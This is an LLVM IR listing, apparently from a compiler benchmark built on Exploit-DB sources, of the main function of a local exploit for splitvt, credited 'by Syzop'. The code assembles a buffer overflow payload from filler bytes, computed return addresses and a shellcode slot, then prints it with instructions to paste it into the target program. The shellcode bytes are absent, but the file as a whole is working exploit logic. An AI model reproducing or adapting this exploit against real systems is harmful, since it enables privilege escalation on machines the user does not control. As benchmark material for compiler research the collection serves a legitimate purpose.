; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20013.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20013.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [27 x i8] c"Splitvt exploit by Syzop\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [24 x i8] c"Can't allocate memory.\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@NOP = common dso_local global i8 0, align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"Paste this 1x:\0A%s\0A\0AAnd this 12x:\0A%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  store i64 134583012, i64* %11, align 8
  %14 = load i32, i32* @stderr, align 4
  %15 = call i32 @fprintf(i32 %14, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0))
  %16 = load i32, i32* %3, align 4
  %17 = icmp sgt i32 %16, 1
  br i1 %17, label %18, label %23

18:                                               ; preds = %2
  %19 = load i8**, i8*** %4, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  %22 = call i64 @atol(i8* %21)
  store i64 %22, i64* %11, align 8
  br label %23

23:                                               ; preds = %18, %2
  %24 = load i64, i64* %11, align 8
  %25 = add nsw i64 %24, 350
  store i64 %25, i64* %12, align 8
  %26 = load i64, i64* %11, align 8
  %27 = add nsw i64 %26, 444
  store i64 %27, i64* %13, align 8
  %28 = call i8* @malloc(i32 1500)
  store i8* %28, i8** %5, align 8
  %29 = icmp ne i8* %28, null
  br i1 %29, label %33, label %30

30:                                               ; preds = %23
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  %32 = call i32 @exit(i32 0) #3
  unreachable

33:                                               ; preds = %23
  %34 = load i8*, i8** @shellcode, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 10
  store i8* %35, i8** %6, align 8
  %36 = load i8*, i8** %6, align 8
  %37 = bitcast i8* %36 to i64*
  store i64* %37, i64** %8, align 8
  %38 = load i64, i64* %13, align 8
  %39 = load i64*, i64** %8, align 8
  %40 = getelementptr inbounds i64, i64* %39, i32 1
  store i64* %40, i64** %8, align 8
  store i64 %38, i64* %39, align 8
  %41 = load i8*, i8** %5, align 8
  store i8* %41, i8** %6, align 8
  %42 = load i8*, i8** %6, align 8
  %43 = bitcast i8* %42 to i64*
  store i64* %43, i64** %8, align 8
  store i32 0, i32* %10, align 4
  br label %44

44:                                               ; preds = %50, %33
  %45 = load i32, i32* %10, align 4
  %46 = icmp slt i32 %45, 300
  br i1 %46, label %47, label %53

47:                                               ; preds = %44
  %48 = load i64*, i64** %8, align 8
  %49 = getelementptr inbounds i64, i64* %48, i32 1
  store i64* %49, i64** %8, align 8
  store i64 1077952576, i64* %48, align 8
  br label %50

50:                                               ; preds = %47
  %51 = load i32, i32* %10, align 4
  %52 = add nsw i32 %51, 4
  store i32 %52, i32* %10, align 4
  br label %44

53:                                               ; preds = %44
  %54 = load i8*, i8** %5, align 8
  %55 = getelementptr inbounds i8, i8* %54, i64 28
  store i8* %55, i8** %6, align 8
  %56 = load i8*, i8** %6, align 8
  %57 = bitcast i8* %56 to i64*
  store i64* %57, i64** %8, align 8
  %58 = load i64, i64* %12, align 8
  %59 = load i64*, i64** %8, align 8
  %60 = getelementptr inbounds i64, i64* %59, i32 1
  store i64* %60, i64** %8, align 8
  store i64 %58, i64* %59, align 8
  store i32 300, i32* %10, align 4
  br label %61

61:                                               ; preds = %70, %53
  %62 = load i32, i32* %10, align 4
  %63 = icmp slt i32 %62, 528
  br i1 %63, label %64, label %73

64:                                               ; preds = %61
  %65 = load i8, i8* @NOP, align 1
  %66 = load i8*, i8** %5, align 8
  %67 = load i32, i32* %10, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %66, i64 %68
  store i8 %65, i8* %69, align 1
  br label %70

70:                                               ; preds = %64
  %71 = load i32, i32* %10, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %10, align 4
  br label %61

73:                                               ; preds = %61
  %74 = load i8*, i8** %5, align 8
  %75 = getelementptr inbounds i8, i8* %74, i64 400
  store i8* %75, i8** %6, align 8
  store i32 0, i32* %10, align 4
  br label %76

76:                                               ; preds = %89, %73
  %77 = load i32, i32* %10, align 4
  %78 = load i8*, i8** @shellcode, align 8
  %79 = call i32 @strlen(i8* %78)
  %80 = icmp slt i32 %77, %79
  br i1 %80, label %81, label %92

81:                                               ; preds = %76
  %82 = load i8*, i8** @shellcode, align 8
  %83 = load i32, i32* %10, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = load i8*, i8** %6, align 8
  %88 = getelementptr inbounds i8, i8* %87, i32 1
  store i8* %88, i8** %6, align 8
  store i8 %86, i8* %87, align 1
  br label %89

89:                                               ; preds = %81
  %90 = load i32, i32* %10, align 4
  %91 = add nsw i32 %90, 1
  store i32 %91, i32* %10, align 4
  br label %76

92:                                               ; preds = %76
  %93 = load i8*, i8** %5, align 8
  %94 = getelementptr inbounds i8, i8* %93, i64 528
  store i8 0, i8* %94, align 1
  %95 = call i8* @malloc(i32 1004)
  store i8* %95, i8** %7, align 8
  %96 = load i8*, i8** %7, align 8
  store i8* %96, i8** %6, align 8
  %97 = load i8*, i8** %6, align 8
  %98 = bitcast i8* %97 to i64*
  store i64* %98, i64** %8, align 8
  store i32 0, i32* %10, align 4
  br label %99

99:                                               ; preds = %106, %92
  %100 = load i32, i32* %10, align 4
  %101 = icmp slt i32 %100, 1000
  br i1 %101, label %102, label %109

102:                                              ; preds = %99
  %103 = load i64, i64* %11, align 8
  %104 = load i64*, i64** %8, align 8
  %105 = getelementptr inbounds i64, i64* %104, i32 1
  store i64* %105, i64** %8, align 8
  store i64 %103, i64* %104, align 8
  br label %106

106:                                              ; preds = %102
  %107 = load i32, i32* %10, align 4
  %108 = add nsw i32 %107, 4
  store i32 %108, i32* %10, align 4
  br label %99

109:                                              ; preds = %99
  %110 = load i8*, i8** %7, align 8
  %111 = getelementptr inbounds i8, i8* %110, i64 1000
  store i8 0, i8* %111, align 1
  %112 = load i8*, i8** %5, align 8
  %113 = load i8*, i8** %7, align 8
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0), i8* %112, i8* %113)
  ret void
}

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i64 @atol(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
